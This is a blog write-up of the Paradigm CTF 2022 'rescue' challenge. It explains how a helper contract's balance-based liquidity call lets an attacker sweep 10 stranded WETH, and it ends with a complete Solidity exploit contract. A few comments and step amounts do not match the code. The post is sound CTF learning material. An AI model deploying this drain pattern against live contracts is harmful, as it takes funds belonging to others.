---
layout: post
title:  "Paradigm CTF Rescue Challenge Explained"
date:   2022-08-28 11:57:16 +0800
---

Two weeks ago I had the opportunity to participate in Paradigm CTF 2022, a well known event in the Web3 security space. This was my first "live" CTF I had ever done and I was happy with how I went overall, but I could have done better when it came to familiarity with tools and time management. The difficulty of the challenges were definitely an eye opener into how much I still have to learn as a security researcher, there were many I missed that I plan to solve (and make writeups for) in the future.

One of the challenges that I solved was named "rescue", where we have to recover 10 wrapped Ether had been accidentally sent to a newly deployed `MasterChefHelper` contract. This contract was made to easily exchange tokens for LP tokens for a given SushiSwap liquidity pool. You pass as arguments the pool you want to provide liquidity to, the token contract, amount of tokens that you want to exchange, as well as an optional minimum out of LP tokens. Upon calling the function `swapTokenForPoolToken` your input tokens are converted into the two tokens supported by the LP and then liquidity is provided, returning LP tokens to the caller.

{% highlight solidity %}
function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external {
        // @note Get the liquidity pool (token) address for the given pool ID
        (address lpToken,,,) = masterchef.poolInfo(poolId);
        // @note Get the two tokens for the given liquidity pool (token)
        address tokenOut0 = UniswapV2PairLike(lpToken).token0();
        address tokenOut1 = UniswapV2PairLike(lpToken).token1();

        // @note Approvals for all three tokens, nothing special
        ERC20Like(tokenIn).approve(address(router), type(uint256).max);
        ERC20Like(tokenOut0).approve(address(router), type(uint256).max);
        ERC20Like(tokenOut1).approve(address(router), type(uint256).max);

        // @note Transfer `amountIn` of `tokenIn` to this contract
        ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn);

        // @note Swap half of the `tokenIn` tokens for `tokenOut0`
        _swap(tokenIn, tokenOut0, amountIn / 2);
        // @note Swap half of the `tokenIn` tokens for `tokenOut0`
        _swap(tokenIn, tokenOut1, amountIn / 2);

        // @note Add liquidity and send LP tokens to `msg.sender'
        _addLiquidity(tokenOut0, tokenOut1, minAmountOut);
}
{% endhighlight %}

If we look at `_addLiquidity()` we see that the amount of tokens to send to `router.addLiquidity()` is determined by the balance of each token rather than a fixed amount determined by the users input `amountIn` from `swapTokenForPoolToken()`. Since the input tokens are split and swapped equally between an LPs `token0` and `token1`, if the LP were to contain WETH there would be an imbalance. Let's say that 1WETH = 1,000USDT and we call `_addLiquidity()` to exchange 1WETH and 1,000USDT for LP tokens. Since their value is the same, all tokens are used and LP tokens are returned. In our case the value will not be the same, because the amount is retrieved from the balance. So if we wanted to exchange 1WETH and 1,000USDT for LP tokens, the balance check would cause the call to `router.addLiquidity()` to pass 11WETH and 1,000USDT. It would be 11WETH because the amount is determined by `balanceOf()` and since we accidentally sent 10WETH to this contract, we have the 1WETH plus the 10WETH.

{% highlight solidity %}
function _addLiquidity(address token0, address token1, uint256 minAmountOut) internal {
        (,, uint256 amountOut) = router.addLiquidity(
                token0,                                     // @note token0
                token1,                                     // @note token1
                ERC20Like(token0).balanceOf(address(this)), // @note amount0Desired
                ERC20Like(token1).balanceOf(address(this)), // @note amount1Desired
                0,                                          // @note amount0Min
                0,                                          // @note amount1Min
                msg.sender,                                 // @note to
                block.timestamp                             // @note deadline
        );
        // @note Ensure that enough LP tokens were created
        require(amountOut >= minAmountOut);
}
{% endhighlight %}

The `router.addLiquidity()` function returns unused amounts, so the 10WETH would remain in the `MasterChefHelper` contract. If we are able to make the 10WETH used by `router.addLiquidity()`, they would be converted into LP tokens and sent to the caller which would be us. We can do this by also sending 10WETH worth of the other token in the pool. Let's go back to our WETH and USDT example, where if we also sent 10WETH worth of USDT (10000) then it would be 11WETH and 11000USDT. The value of these amounts are equal so they will all be consumed and converted into LP tokens which are sent back to us.

To save any errors when developing the solution I assumed that my input token couldn't be the same as any of the tokens in my target LP, so I chose to exchange USDC tokens for USDT-WETH LP tokens. I also made sure to transfer a little more than 10WETH worth of USDT to the `MasterChefHelper` contract because I was concerned that if I used the exact amount there may be a little amount of dust left, but the challenge requires the balance to be exactly zero. In summary here are the steps needed to complete the challenge:

1. Swap 10.1 WETH for USDT
2. Swap 1 WETH for USDC
3. Transfer all USDT (10.1 WETH worth) to the `MasterChefHelper` contract
4. Call `swapTokenForPoolToken` and provide all the USDC balance
5. During the call to `router.addLiquidity()` the 10.1WETH worth of USDT matches up with the 10WETH and it is converted into LP tokens which are sent to us

My exploit contract is shown below:

{% highlight solidity %}
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IWETH9 is IERC20 {
    function deposit() external payable;
}

interface UniswapV2RouterLike {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IMasterChefHelper {
    function swapTokenForPoolToken(
        uint256 poolId,
        address tokenIn,
        uint256 amountIn,
        uint256 minAmountOut
    ) external;
}

contract Attack {

    // SafeERC20 is needed for USDT
    using SafeERC20 for IERC20;

    // Wrapped Ether contract
    IWETH9 constant weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // USDT contract
    IERC20 constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    // USDC contract
    IERC20 constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // Sushiswap router
    UniswapV2RouterLike constant router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);

    // Masterchef helper
    IMasterChefHelper constant mshelper = IMasterChefHelper(0x81d8AD854367fb9D66c0BA37D9cA4269a7631A9C);

    constructor() payable {
        // Need enough Ether for attack
        require(msg.value == 50 ether, "Need 50 Ether");

        // Get 50 Wrapped Ether
        weth.deposit{value: 50 ether}();

        // Exchange 15 WETH for USDT
        address[] memory pathc = new address[](2);
        pathc[0] = address(weth);
        pathc[1] = address(usdc);

        weth.approve(address(router), 1 ether);

        router.swapExactTokensForTokens(
            1 ether,
            0,
            pathc,
            address(this),
            block.timestamp
        );

        // Exchange 15 WETH for USDT
        address[] memory patht = new address[](2);
        patht[0] = address(weth);
        patht[1] = address(usdt);

        weth.approve(address(router), 15 ether);

        router.swapExactTokensForTokens(
            15 ether,
            0,
            patht,
            address(this),
            block.timestamp
        );

        // Get USDT balance
        uint256 usdt_balance = usdt.balanceOf(address(this));

        // Transfer USDT balance (15 Ether worth) to MasterChefHelper
        usdt.safeTransfer(address(mshelper), usdt_balance);

        // Get USDC balance
        uint256 usdc_balance = usdc.balanceOf(address(this));

        // Approve a transfer of USDC to MasterChefHelper
        usdc.approve(address(mshelper), usdc_balance);

        // Attempt a swap
        mshelper.swapTokenForPoolToken(
            0,
            address(usdc),
            usdc_balance,
            0
        );
    }
}
{% endhighlight %}

[jekyll-docs]: https://jekyllrb.com/docs/home
[jekyll-gh]:   https://github.com/jekyll/jekyll
[jekyll-talk]: https://talk.jekyllrb.com/
